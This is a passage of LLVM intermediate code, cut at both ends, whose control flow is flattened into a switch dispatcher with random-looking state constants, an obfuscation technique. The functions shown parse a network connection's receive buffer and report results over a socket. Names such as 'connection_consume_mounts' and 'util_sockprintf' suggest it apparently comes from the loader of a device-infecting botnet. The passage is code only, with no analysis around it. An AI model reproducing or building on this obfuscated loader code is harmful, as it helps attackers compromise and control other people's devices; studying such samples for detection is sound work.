    i32 1521738143, label %207
    i32 543479315, label %208
    i32 1412839939, label %213
    i32 -708023128, label %222
    i32 77523292, label %231
    i32 1765806658, label %234
    i32 -1323984093, label %243
    i32 -746870120, label %252
    i32 -1667883568, label %261
    i32 -1676642600, label %270
    i32 -1453608806, label %273
    i32 13888989, label %274
    i32 -1378843246, label %275
    i32 -1702138298, label %278
    i32 -578077514, label %282
    i32 -17963379, label %286
    i32 -1958377005, label %292
    i32 -367369355, label %293
    i32 -943574885, label %294
    i32 -1322617859, label %295
    i32 170626838, label %303
    i32 -1000326188, label %304
    i32 170450025, label %305
    i32 -1706748941, label %308
    i32 -815263595, label %312
    i32 -727839189, label %319
    i32 -755679009, label %339
    i32 1941561048, label %340
    i32 -2073916205, label %341
    i32 2035212876, label %349
    i32 2104418277, label %359
    i32 -548803234, label %365
    i32 687957275, label %366
    i32 879385276, label %369
    i32 -182528449, label %371
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i32, i32* %6, align 4
  store i32 %28, i32* %.reg2mem
  %29 = load i32, i32* %4, align 4
  %30 = icmp eq i32 %29, -1
  %31 = select i1 %30, i32 894317963, i32 -1829153028
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = load %struct.connection*, %struct.connection** %3, align 8
  %34 = getelementptr inbounds %struct.connection, %struct.connection* %33, i32 0, i32 9
  %35 = load i16, i16* %34, align 8
  %36 = zext i16 %35 to i32
  store i32 -122622077, i32* %switchVar
  store i32 %36, i32* %.reg2mem2
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i32, i32* %4, align 4
  store i32 -122622077, i32* %switchVar
  store i32 %38, i32* %.reg2mem2
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %.reload3 = load i32, i32* %.reg2mem2
  %.reload = load volatile i32, i32* %.reg2mem
  %40 = icmp slt i32 %.reload, %.reload3
  %41 = select i1 %40, i32 -1163176617, i32 -1706748941
  store i32 %41, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load %struct.connection*, %struct.connection** %3, align 8
  %44 = getelementptr inbounds %struct.connection, %struct.connection* %43, i32 0, i32 15
  %45 = load i32, i32* %6, align 4
  %46 = sext i32 %45 to i64
  %47 = getelementptr inbounds [8192 x i8], [8192 x i8]* %44, i64 0, i64 %46
  %48 = load i8, i8* %47, align 1
  %49 = zext i8 %48 to i32
  %50 = icmp eq i32 %49, 13
  %51 = select i1 %50, i32 585563597, i32 -1130506671
  store i32 %51, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load %struct.connection*, %struct.connection** %3, align 8
  %54 = getelementptr inbounds %struct.connection, %struct.connection* %53, i32 0, i32 15
  %55 = load i32, i32* %6, align 4
  %56 = sext i32 %55 to i64
  %57 = getelementptr inbounds [8192 x i8], [8192 x i8]* %54, i64 0, i64 %56
  store i8 0, i8* %57, align 1
  store i32 -1000326188, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load %struct.connection*, %struct.connection** %3, align 8
  %60 = getelementptr inbounds %struct.connection, %struct.connection* %59, i32 0, i32 15
  %61 = load i32, i32* %6, align 4
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds [8192 x i8], [8192 x i8]* %60, i64 0, i64 %62
  %64 = load i8, i8* %63, align 1
  %65 = zext i8 %64 to i32
  %66 = icmp eq i32 %65, 10
  %67 = select i1 %66, i32 -1292490192, i32 170626838
  store i32 %67, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  store i8 0, i8* %8, align 1
  store i8 0, i8* %9, align 1
  store i8* null, i8** %10, align 8
  store i8* null, i8** %11, align 8
  %69 = load %struct.connection*, %struct.connection** %3, align 8
  %70 = getelementptr inbounds %struct.connection, %struct.connection* %69, i32 0, i32 15
  %71 = load i32, i32* %6, align 4
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds [8192 x i8], [8192 x i8]* %70, i64 0, i64 %72
  store i8 0, i8* %73, align 1
  store i32 0, i32* %7, align 4
  store i32 52214070, i32* %switchVar
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  %75 = load i32, i32* %7, align 4
  %76 = sext i32 %75 to i64
  %77 = load %struct.connection*, %struct.connection** %3, align 8
  %78 = getelementptr inbounds %struct.connection, %struct.connection* %77, i32 0, i32 15
  %79 = load i32, i32* %6, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds [8192 x i8], [8192 x i8]* %78, i64 0, i64 %80
  %82 = load i8*, i8** %5, align 8
  %83 = ptrtoint i8* %81 to i64
  %84 = ptrtoint i8* %82 to i64
  %85 = sub i64 %83, %84
  %86 = icmp slt i64 %76, %85
  %87 = select i1 %86, i32 -325403009, i32 1938244572
  store i32 %87, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  %89 = load i8*, i8** %5, align 8
  %90 = load i32, i32* %7, align 4
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds i8, i8* %89, i64 %91
  %93 = load i8, i8* %92, align 1
  %94 = sext i8 %93 to i32
  %95 = icmp eq i32 %94, 32
  %96 = select i1 %95, i32 -76262579, i32 -140549506
  store i32 %96, i32* %switchVar
  br label %loopEnd

; <label>:97:                                     ; preds = %loopEntry
  %98 = load i8*, i8** %5, align 8
  %99 = load i32, i32* %7, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds i8, i8* %98, i64 %100
  %102 = load i8, i8* %101, align 1
  %103 = sext i8 %102 to i32
  %104 = icmp eq i32 %103, 9
  %105 = select i1 %104, i32 -76262579, i32 1656018996
  store i32 %105, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = load i8*, i8** %5, align 8
  %108 = load i32, i32* %7, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8, i8* %107, i64 %109
  %111 = load i8, i8* %110, align 1
  %112 = sext i8 %111 to i32
  %113 = icmp eq i32 %112, 0
  %114 = select i1 %113, i32 -76262579, i32 419632203
  store i32 %114, i32* %switchVar
  br label %loopEnd

; <label>:115:                                    ; preds = %loopEntry
  %116 = load i8, i8* %8, align 1
  %117 = zext i8 %116 to i32
  %118 = icmp sgt i32 %117, 0
  %119 = select i1 %118, i32 1079918896, i32 1059534070
  store i32 %119, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = load i8, i8* %9, align 1
  %122 = icmp ne i8 %121, 0
  %123 = select i1 %122, i32 1059534070, i32 154235129
  store i32 %123, i32* %switchVar
  br label %loopEnd

; <label>:124:                                    ; preds = %loopEntry
  %125 = load i8, i8* %8, align 1
  %126 = add i8 %125, 1
  store i8 %126, i8* %8, align 1
  store i32 1059534070, i32* %switchVar
  br label %loopEnd

; <label>:127:                                    ; preds = %loopEntry
  %128 = load i8*, i8** %5, align 8
  %129 = load i32, i32* %7, align 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds i8, i8* %128, i64 %130
  store i8 0, i8* %131, align 1
  store i8 1, i8* %9, align 1
  store i32 1829967931, i32* %switchVar
  br label %loopEnd

; <label>:132:                                    ; preds = %loopEntry
  %133 = load i8, i8* %8, align 1
  %134 = zext i8 %133 to i32
  %135 = icmp eq i32 %134, 0
  %136 = select i1 %135, i32 809163729, i32 197802920
  store i32 %136, i32* %switchVar
  br label %loopEnd

; <label>:137:                                    ; preds = %loopEntry
  %138 = load i8*, i8** %5, align 8
  %139 = load i32, i32* %7, align 4
  %140 = sext i32 %139 to i64
  %141 = getelementptr inbounds i8, i8* %138, i64 %140
  store i8* %141, i8** %10, align 8
  %142 = load i8, i8* %8, align 1
  %143 = add i8 %142, 1
  store i8 %143, i8* %8, align 1
  store i32 182234961, i32* %switchVar
  br label %loopEnd

; <label>:144:                                    ; preds = %loopEntry
  %145 = load i8, i8* %8, align 1
  %146 = zext i8 %145 to i32
  %147 = icmp sge i32 %146, 3
  %148 = select i1 %147, i32 -1649366180, i32 -658596592
  store i32 %148, i32* %switchVar
  br label %loopEnd

; <label>:149:                                    ; preds = %loopEntry
  %150 = load i8, i8* %8, align 1
  %151 = zext i8 %150 to i32
  %152 = icmp sle i32 %151, 5
  %153 = select i1 %152, i32 59348108, i32 -658596592
  store i32 %153, i32* %switchVar
  br label %loopEnd

; <label>:154:                                    ; preds = %loopEntry
  %155 = load i8, i8* %9, align 1
  %156 = sext i8 %155 to i32
  %157 = icmp ne i32 %156, 0
  %158 = select i1 %157, i32 -15897161, i32 -658596592
  store i32 %158, i32* %switchVar
  br label %loopEnd

; <label>:159:                                    ; preds = %loopEntry
  %160 = load i8*, i8** %5, align 8
  %161 = load i32, i32* %7, align 4
  %162 = sext i32 %161 to i64
  %163 = getelementptr inbounds i8, i8* %160, i64 %162
  store i8* %163, i8** %11, align 8
  store i32 -658596592, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  store i32 182234961, i32* %switchVar
  br label %loopEnd

; <label>:165:                                    ; preds = %loopEntry
  store i8 0, i8* %9, align 1
  store i32 1829967931, i32* %switchVar
  br label %loopEnd

; <label>:166:                                    ; preds = %loopEntry
  store i32 1907402504, i32* %switchVar
  br label %loopEnd

; <label>:167:                                    ; preds = %loopEntry
  %168 = load i32, i32* %7, align 4
  %169 = add nsw i32 %168, 1
  store i32 %169, i32* %7, align 4
  store i32 52214070, i32* %switchVar
  br label %loopEnd

; <label>:170:                                    ; preds = %loopEntry
  %171 = load i8*, i8** %10, align 8
  %172 = icmp ne i8* %171, null
  %173 = select i1 %172, i32 1301305021, i32 -1322617859
  store i32 %173, i32* %switchVar
  br label %loopEnd

; <label>:174:                                    ; preds = %loopEntry
  %175 = load i8*, i8** %11, align 8
  %176 = icmp ne i8* %175, null
  %177 = select i1 %176, i32 1003150835, i32 -1322617859
  store i32 %177, i32* %switchVar
  br label %loopEnd

; <label>:178:                                    ; preds = %loopEntry
  %179 = load i8*, i8** %10, align 8
  %180 = call i32 @atoi(i8* %179) #6
  store i32 %180, i32* %12, align 4
  %181 = load i8*, i8** %11, align 8
  %182 = call i64 @strlen(i8* %181) #6
  %183 = trunc i64 %182 to i32
  store i32 %183, i32* %13, align 4
  %184 = load i32, i32* %12, align 4
  %185 = icmp ne i32 %184, 1
  %186 = select i1 %185, i32 759198897, i32 1229258368
  store i32 %186, i32* %switchVar
  br label %loopEnd

; <label>:187:                                    ; preds = %loopEntry
  %188 = load i8*, i8** %11, align 8
  %189 = call i32 @strcmp(i8* %188, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.9, i32 0, i32 0)) #6
  %190 = icmp eq i32 %189, 0
  %191 = select i1 %190, i32 329385465, i32 992026315
  store i32 %191, i32* %switchVar
  br label %loopEnd

; <label>:192:                                    ; preds = %loopEntry
  %193 = load i8*, i8** %11, align 8
  %194 = call i32 @strcmp(i8* %193, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.10, i32 0, i32 0)) #6
  %195 = icmp eq i32 %194, 0
  %196 = select i1 %195, i32 329385465, i32 1229258368
  store i32 %196, i32* %switchVar
  br label %loopEnd

; <label>:197:                                    ; preds = %loopEntry
  %198 = load %struct.connection*, %struct.connection** %3, align 8
  %199 = getelementptr inbounds %struct.connection, %struct.connection* %198, i32 0, i32 4
  %200 = load i32, i32* %199, align 8
  %201 = load i32, i32* %12, align 4
  %202 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %200, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.11, i32 0, i32 0), i32 %201)
  store i32 -943574885, i32* %switchVar
  br label %loopEnd

; <label>:203:                                    ; preds = %loopEntry
  %204 = load i32, i32* %12, align 4
  %205 = icmp sgt i32 %204, 400
  %206 = select i1 %205, i32 1521738143, i32 -367369355
  store i32 %206, i32* %switchVar
  br label %loopEnd

; <label>:207:                                    ; preds = %loopEntry
  store i32 0, i32* %14, align 4
  store i32 0, i32* %15, align 4
  store i32 0, i32* %7, align 4
  store i32 543479315, i32* %switchVar
  br label %loopEnd

; <label>:208:                                    ; preds = %loopEntry
  %209 = load i32, i32* %7, align 4
  %210 = load i32, i32* %13, align 4
  %211 = icmp slt i32 %209, %210
  %212 = select i1 %211, i32 1412839939, i32 -1702138298
  store i32 %212, i32* %switchVar
  br label %loopEnd

; <label>:213:                                    ; preds = %loopEntry
  %214 = load i8*, i8** %11, align 8
  %215 = load i32, i32* %7, align 4
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds i8, i8* %214, i64 %216
  %218 = load i8, i8* %217, align 1
  %219 = sext i8 %218 to i32
  %220 = icmp sge i32 %219, 48
  %221 = select i1 %220, i32 -708023128, i32 1765806658
  store i32 %221, i32* %switchVar
  br label %loopEnd

; <label>:222:                                    ; preds = %loopEntry
  %223 = load i8*, i8** %11, align 8
  %224 = load i32, i32* %7, align 4
  %225 = sext i32 %224 to i64
  %226 = getelementptr inbounds i8, i8* %223, i64 %225
  %227 = load i8, i8* %226, align 1
  %228 = sext i8 %227 to i32
  %229 = icmp sle i32 %228, 57
  %230 = select i1 %229, i32 77523292, i32 1765806658
  store i32 %230, i32* %switchVar
  br label %loopEnd

; <label>:231:                                    ; preds = %loopEntry
  %232 = load i32, i32* %14, align 4
  %233 = add nsw i32 %232, 1
  store i32 %233, i32* %14, align 4
  store i32 13888989, i32* %switchVar
  br label %loopEnd

; <label>:234:                                    ; preds = %loopEntry
  %235 = load i8*, i8** %11, align 8
  %236 = load i32, i32* %7, align 4
  %237 = sext i32 %236 to i64
  %238 = getelementptr inbounds i8, i8* %235, i64 %237
  %239 = load i8, i8* %238, align 1
  %240 = sext i8 %239 to i32
  %241 = icmp sge i32 %240, 97
  %242 = select i1 %241, i32 -1323984093, i32 -746870120
  store i32 %242, i32* %switchVar
  br label %loopEnd

; <label>:243:                                    ; preds = %loopEntry
  %244 = load i8*, i8** %11, align 8
  %245 = load i32, i32* %7, align 4
  %246 = sext i32 %245 to i64
  %247 = getelementptr inbounds i8, i8* %244, i64 %246
  %248 = load i8, i8* %247, align 1
  %249 = sext i8 %248 to i32
  %250 = icmp sle i32 %249, 122
  %251 = select i1 %250, i32 -1676642600, i32 -746870120
  store i32 %251, i32* %switchVar
  br label %loopEnd

; <label>:252:                                    ; preds = %loopEntry
  %253 = load i8*, i8** %11, align 8
  %254 = load i32, i32* %7, align 4
  %255 = sext i32 %254 to i64
  %256 = getelementptr inbounds i8, i8* %253, i64 %255
  %257 = load i8, i8* %256, align 1
  %258 = sext i8 %257 to i32
  %259 = icmp sge i32 %258, 65
  %260 = select i1 %259, i32 -1667883568, i32 -1453608806
  store i32 %260, i32* %switchVar
  br label %loopEnd

; <label>:261:                                    ; preds = %loopEntry
  %262 = load i8*, i8** %11, align 8
  %263 = load i32, i32* %7, align 4
  %264 = sext i32 %263 to i64
  %265 = getelementptr inbounds i8, i8* %262, i64 %264
  %266 = load i8, i8* %265, align 1
  %267 = sext i8 %266 to i32
  %268 = icmp sle i32 %267, 90
  %269 = select i1 %268, i32 -1676642600, i32 -1453608806
  store i32 %269, i32* %switchVar
  br label %loopEnd

; <label>:270:                                    ; preds = %loopEntry
  %271 = load i32, i32* %15, align 4
  %272 = add nsw i32 %271, 1
  store i32 %272, i32* %15, align 4
  store i32 -1702138298, i32* %switchVar
  br label %loopEnd

; <label>:273:                                    ; preds = %loopEntry
  store i32 13888989, i32* %switchVar
  br label %loopEnd

; <label>:274:                                    ; preds = %loopEntry
  store i32 -1378843246, i32* %switchVar
  br label %loopEnd

; <label>:275:                                    ; preds = %loopEntry
  %276 = load i32, i32* %7, align 4
  %277 = add nsw i32 %276, 1
  store i32 %277, i32* %7, align 4
  store i32 543479315, i32* %switchVar
  br label %loopEnd

; <label>:278:                                    ; preds = %loopEntry
  %279 = load i32, i32* %15, align 4
  %280 = icmp eq i32 %279, 0
  %281 = select i1 %280, i32 -578077514, i32 -1958377005
  store i32 %281, i32* %switchVar
  br label %loopEnd

; <label>:282:                                    ; preds = %loopEntry
  %283 = load i32, i32* %14, align 4
  %284 = icmp sgt i32 %283, 0
  %285 = select i1 %284, i32 -17963379, i32 -1958377005
  store i32 %285, i32* %switchVar
  br label %loopEnd

; <label>:286:                                    ; preds = %loopEntry
  %287 = load %struct.connection*, %struct.connection** %3, align 8
  %288 = getelementptr inbounds %struct.connection, %struct.connection* %287, i32 0, i32 4
  %289 = load i32, i32* %288, align 8
  %290 = load i32, i32* %12, align 4
  %291 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %289, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.11, i32 0, i32 0), i32 %290)
  store i32 -1958377005, i32* %switchVar
  br label %loopEnd

; <label>:292:                                    ; preds = %loopEntry
  store i32 -367369355, i32* %switchVar
  br label %loopEnd

; <label>:293:                                    ; preds = %loopEntry
  store i32 -943574885, i32* %switchVar
  br label %loopEnd

; <label>:294:                                    ; preds = %loopEntry
  store i32 -1322617859, i32* %switchVar
  br label %loopEnd

; <label>:295:                                    ; preds = %loopEntry
  %296 = load %struct.connection*, %struct.connection** %3, align 8
  %297 = getelementptr inbounds %struct.connection, %struct.connection* %296, i32 0, i32 15
  %298 = getelementptr inbounds [8192 x i8], [8192 x i8]* %297, i32 0, i32 0
  %299 = load i32, i32* %6, align 4
  %300 = sext i32 %299 to i64
  %301 = getelementptr inbounds i8, i8* %298, i64 %300
  %302 = getelementptr inbounds i8, i8* %301, i64 1
  store i8* %302, i8** %5, align 8
  store i32 170626838, i32* %switchVar
  br label %loopEnd

; <label>:303:                                    ; preds = %loopEntry
  store i32 -1000326188, i32* %switchVar
  br label %loopEnd

; <label>:304:                                    ; preds = %loopEntry
  store i32 170450025, i32* %switchVar
  br label %loopEnd

; <label>:305:                                    ; preds = %loopEntry
  %306 = load i32, i32* %6, align 4
  %307 = add nsw i32 %306, 1
  store i32 %307, i32* %6, align 4
  store i32 651136845, i32* %switchVar
  br label %loopEnd

; <label>:308:                                    ; preds = %loopEntry
  %309 = load i32, i32* %4, align 4
  %310 = icmp eq i32 %309, -1
  %311 = select i1 %310, i32 -815263595, i32 1941561048
  store i32 %311, i32* %switchVar
  br label %loopEnd

; <label>:312:                                    ; preds = %loopEntry
  %313 = load %struct.connection*, %struct.connection** %3, align 8
  %314 = getelementptr inbounds %struct.connection, %struct.connection* %313, i32 0, i32 9
  %315 = load i16, i16* %314, align 8
  %316 = zext i16 %315 to i32
  %317 = icmp sgt i32 %316, 7168
  %318 = select i1 %317, i32 -727839189, i32 -755679009
  store i32 %318, i32* %switchVar
  br label %loopEnd

; <label>:319:                                    ; preds = %loopEntry
  %320 = load %struct.connection*, %struct.connection** %3, align 8
  %321 = getelementptr inbounds %struct.connection, %struct.connection* %320, i32 0, i32 15
  %322 = getelementptr inbounds [8192 x i8], [8192 x i8]* %321, i32 0, i32 0
  %323 = load %struct.connection*, %struct.connection** %3, align 8
  %324 = getelementptr inbounds %struct.connection, %struct.connection* %323, i32 0, i32 15
  %325 = getelementptr inbounds [8192 x i8], [8192 x i8]* %324, i32 0, i32 0
  %326 = getelementptr inbounds i8, i8* %325, i64 6144
  %327 = load %struct.connection*, %struct.connection** %3, align 8
  %328 = getelementptr inbounds %struct.connection, %struct.connection* %327, i32 0, i32 9
  %329 = load i16, i16* %328, align 8
  %330 = zext i16 %329 to i32
  %331 = sub nsw i32 %330, 6144
  %332 = sext i32 %331 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %322, i8* %326, i64 %332, i32 1, i1 false)
  %333 = load %struct.connection*, %struct.connection** %3, align 8
  %334 = getelementptr inbounds %struct.connection, %struct.connection* %333, i32 0, i32 9
  %335 = load i16, i16* %334, align 8
  %336 = zext i16 %335 to i32
  %337 = sub nsw i32 %336, 6144
  %338 = trunc i32 %337 to i16
  store i16 %338, i16* %334, align 8
  store i32 -755679009, i32* %switchVar
  br label %loopEnd

; <label>:339:                                    ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 -182528449, i32* %switchVar
  br label %loopEnd

; <label>:340:                                    ; preds = %loopEntry
  store i32 0, i32* %6, align 4
  store i32 -2073916205, i32* %switchVar
  br label %loopEnd

; <label>:341:                                    ; preds = %loopEntry
  %342 = load i32, i32* %6, align 4
  %343 = load %struct.connection*, %struct.connection** %3, align 8
  %344 = getelementptr inbounds %struct.connection, %struct.connection* %343, i32 0, i32 9
  %345 = load i16, i16* %344, align 8
  %346 = zext i16 %345 to i32
  %347 = icmp slt i32 %342, %346
  %348 = select i1 %347, i32 2035212876, i32 879385276
  store i32 %348, i32* %switchVar
  br label %loopEnd

; <label>:349:                                    ; preds = %loopEntry
  %350 = load %struct.connection*, %struct.connection** %3, align 8
  %351 = getelementptr inbounds %struct.connection, %struct.connection* %350, i32 0, i32 15
  %352 = load i32, i32* %6, align 4
  %353 = sext i32 %352 to i64
  %354 = getelementptr inbounds [8192 x i8], [8192 x i8]* %351, i64 0, i64 %353
  %355 = load i8, i8* %354, align 1
  %356 = zext i8 %355 to i32
  %357 = icmp eq i32 %356, 0
  %358 = select i1 %357, i32 2104418277, i32 -548803234
  store i32 %358, i32* %switchVar
  br label %loopEnd

; <label>:359:                                    ; preds = %loopEntry
  %360 = load %struct.connection*, %struct.connection** %3, align 8
  %361 = getelementptr inbounds %struct.connection, %struct.connection* %360, i32 0, i32 15
  %362 = load i32, i32* %6, align 4
  %363 = sext i32 %362 to i64
  %364 = getelementptr inbounds [8192 x i8], [8192 x i8]* %361, i64 0, i64 %363
  store i8 32, i8* %364, align 1
  store i32 -548803234, i32* %switchVar
  br label %loopEnd

; <label>:365:                                    ; preds = %loopEntry
  store i32 687957275, i32* %switchVar
  br label %loopEnd

; <label>:366:                                    ; preds = %loopEntry
  %367 = load i32, i32* %6, align 4
  %368 = add nsw i32 %367, 1
  store i32 %368, i32* %6, align 4
  store i32 -2073916205, i32* %switchVar
  br label %loopEnd

; <label>:369:                                    ; preds = %loopEntry
  %370 = load i32, i32* %4, align 4
  store i32 %370, i32* %2, align 4
  store i32 -182528449, i32* %switchVar
  br label %loopEnd

; <label>:371:                                    ; preds = %loopEntry
  %372 = load i32, i32* %2, align 4
  ret i32 %372

loopEnd:                                          ; preds = %369, %366, %365, %359, %349, %341, %340, %339, %319, %312, %308, %305, %304, %303, %295, %294, %293, %292, %286, %282, %278, %275, %274, %273, %270, %261, %252, %243, %234, %231, %222, %213, %208, %207, %203, %197, %192, %187, %178, %174, %170, %167, %166, %165, %164, %159, %154, %149, %144, %137, %132, %127, %124, %120, %115, %106, %97, %88, %74, %68, %58, %52, %42, %39, %37, %32, %27, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #4

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #4

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #2

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_mounts(%struct.connection*) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca [256 x i8], align 16
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  store %struct.connection* %0, %struct.connection** %3, align 8
  store i32 0, i32* %5, align 4
  store i32 0, i32* %6, align 4
  %11 = load %struct.connection*, %struct.connection** %3, align 8
  %12 = getelementptr inbounds %struct.connection, %struct.connection* %11, i32 0, i32 15
  %13 = getelementptr inbounds [8192 x i8], [8192 x i8]* %12, i32 0, i32 0
  %14 = load %struct.connection*, %struct.connection** %3, align 8
  %15 = getelementptr inbounds %struct.connection, %struct.connection* %14, i32 0, i32 9
  %16 = load i16, i16* %15, align 8
  %17 = zext i16 %16 to i32
  %18 = call i32 @util_memsearch(i8* %13, i32 %17, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i32 0, i32 0), i32 23)
  store i32 %18, i32* %8, align 4
  %19 = load i32, i32* %8, align 4
  store i32 %19, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1609740249, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1609740249, label %first
    i32 229119911, label %22
    i32 -1126096953, label %23
    i32 -1659542471, label %24
    i32 -596665910, label %29
    i32 -467202763, label %34
    i32 -468497523, label %35
    i32 96391776, label %45
    i32 -1412260260, label %55
    i32 658132558, label %56
    i32 1247680218, label %60
    i32 1325334587, label %61
    i32 1664940389, label %65
    i32 -515538036, label %66
    i32 624230108, label %76
    i32 -537308780, label %82
    i32 -1222101371, label %90
    i32 -510349347, label %100
    i32 -205395666, label %101
    i32 805303036, label %102
    i32 556507392, label %112
    i32 -237724973, label %122
    i32 196694530, label %127
    i32 -1839361389, label %138
    i32 -502864212, label %139
    i32 -1660181862, label %149
    i32 -1147039146, label %160
    i32 1367267882, label %161
    i32 258563613, label %162
    i32 -1396221083, label %163
    i32 1799130990, label %166
    i32 224769933, label %176
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %20 = icmp eq i32 %.reload, -1
  %21 = select i1 %20, i32 229119911, i32 -1126096953
  store i32 %21, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 224769933, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  store i32 0, i32* %7, align 4
  store i32 -1659542471, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i32, i32* %7, align 4
  %26 = load i32, i32* %8, align 4
  %27 = icmp slt i32 %25, %26
  %28 = select i1 %27, i32 -596665910, i32 1799130990
  store i32 %28, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i32, i32* %5, align 4
  %31 = sext i32 %30 to i64
  %32 = icmp eq i64 %31, 255
  %33 = select i1 %32, i32 -467202763, i32 -468497523
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i32 1799130990, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load %struct.connection*, %struct.connection** %3, align 8
  %37 = getelementptr inbounds %struct.connection, %struct.connection* %36, i32 0, i32 15
  %38 = load i32, i32* %7, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds [8192 x i8], [8192 x i8]* %37, i64 0, i64 %39
  %41 = load i8, i8* %40, align 1
  %42 = zext i8 %41 to i32
  %43 = icmp eq i32 %42, 10
  %44 = select i1 %43, i32 96391776, i32 805303036
  store i32 %44, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i32, i32* %5, align 4
  %47 = add nsw i32 %46, 1
  store i32 %47, i32* %5, align 4
  %48 = sext i32 %46 to i64
  %49 = getelementptr inbounds [256 x i8], [256 x i8]* %4, i64 0, i64 %48
  store i8 0, i8* %49, align 1
  %50 = getelementptr inbounds [256 x i8], [256 x i8]* %4, i32 0, i32 0
  %51 = call i8* @strtok(i8* %50, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.12, i32 0, i32 0)) #5
  %52 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.12, i32 0, i32 0)) #5
  store i8* %52, i8** %9, align 8
  %53 = icmp eq i8* %52, null
  %54 = select i1 %53, i32 -1412260260, i32 658132558
  store i32 %54, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  store i32 -205395666, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.12, i32 0, i32 0)) #5
  %58 = icmp eq i8* %57, null
  %59 = select i1 %58, i32 1247680218, i32 1325334587
  store i32 %59, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  store i32 -205395666, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.12, i32 0, i32 0)) #5
  store i8* %62, i8** %10, align 8
  %63 = icmp eq i8* %62, null
  %64 = select i1 %63, i32 1664940389, i32 -515538036
  store i32 %64, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  store i32 -205395666, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i8*, i8** %9, align 8
  %68 = load i8*, i8** %9, align 8
  %69 = call i64 @strlen(i8* %68) #6
  %70 = sub i64 %69, 1
  %71 = getelementptr inbounds i8, i8* %67, i64 %70
  %72 = load i8, i8* %71, align 1
  %73 = sext i8 %72 to i32
  %74 = icmp eq i32 %73, 47
  %75 = select i1 %74, i32 624230108, i32 -537308780
  store i32 %75, i32* %switchVar
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  %77 = load i8*, i8** %9, align 8
  %78 = load i8*, i8** %9, align 8
  %79 = call i64 @strlen(i8* %78) #6
  %80 = sub i64 %79, 1
  %81 = getelementptr inbounds i8, i8* %77, i64 %80
